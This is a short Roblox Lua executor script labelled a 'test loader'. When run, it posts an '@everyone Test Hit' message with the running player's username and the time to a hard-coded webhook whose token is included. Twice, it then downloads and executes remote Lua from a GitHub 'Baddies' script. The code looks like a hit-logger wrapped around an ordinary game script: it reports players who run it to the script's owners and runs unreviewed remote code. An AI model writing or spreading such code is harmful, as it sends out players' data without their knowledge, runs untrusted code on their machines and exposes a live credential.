-- Test Loader with Direct Notification

_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUE"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}

_G.PING_POOR = true

-- Simple test message
task.spawn(function()
    if _G.POOR_WEBHOOK then
        local data = {
            content = "@everyone **Test Hit**\nUsername: " .. game.Players.LocalPlayer.Name .. "\nExecutor: Delta\nTime: " .. os.date("%X")
        }
        game:HttpPost(_G.POOR_WEBHOOK, game:GetService("HttpService"):JSONEncode(data))
    end
end)

-- Load the original Baddies anyway
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
end)
-- Load the original Baddies anyway
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
end)
